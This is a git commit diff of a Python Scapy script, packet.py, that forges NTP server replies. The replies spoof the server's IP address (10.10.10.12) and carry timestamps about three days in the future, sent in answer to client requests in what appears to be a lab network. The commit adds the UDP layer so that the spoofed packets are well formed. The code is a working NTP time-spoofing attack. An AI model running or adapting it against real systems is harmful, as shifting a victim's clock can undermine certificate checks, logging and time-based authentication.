c6d2a4b9b78db1c3cffb10957be6580f06f8c4f0
mjkadzi <161668993+mjkadzi@users.noreply.github.com>
2024-04-24 18:45:00 -0500

    Update packet.py
    added some networking info

--- packet.py
+++ packet.py
@@ -3,31 +3,33 @@ from scapy.layers.ntp import NTP
 import time
 
 server_ip = "10.10.10.12"
-src_ip = "10.10.10.10"
 ref_timestamp = time.time() + 259200
 
-def send_ntp(server_ip, src_ip, ref_timestamp):
+def send_ntp(server, packetsrc, ref_timestamp):
     ntp_packet = NTP()
 
     ntp_packet.ref = ref_timestamp
     ntp_packet.version = 3
-    ntp_packet.refid = server_ip
+    ntp_packet.refid = server
     ntp_packet.delay = 1
     ntp_packet.dispersion = 16
     ntp_packet.precision = 1
     ntp_packet.poll = 4
     ntp_packet.mode = 4
-    ntp_packet.id = server_ip
+    ntp_packet.id = server
     ntp_packet.orig = time.time() + 259201
     ntp_packet.recv = time.time() + 259201
     ntp_packet.sent =time.time() + 259201
 
-    ip_packet = IP(src=server_ip, dst=src_ip)
+    ip_packet = IP(src=server, dst=packetsrc)
+    udp_packet = UDP(dport=123, sport=123)
 
     print("Packet before sending")
     ntp_packet.show()
+    ip_packet.show()
+    udp_packet.show()
 
-    send(ip_packet/ntp_packet, verbose=True)
+    send(ip_packet/udp_packet/ntp_packet, verbose=True)
 
 def ntp_request(packet):
     if packet.haslayer(NTP) and packet[NTP].mode == 3:
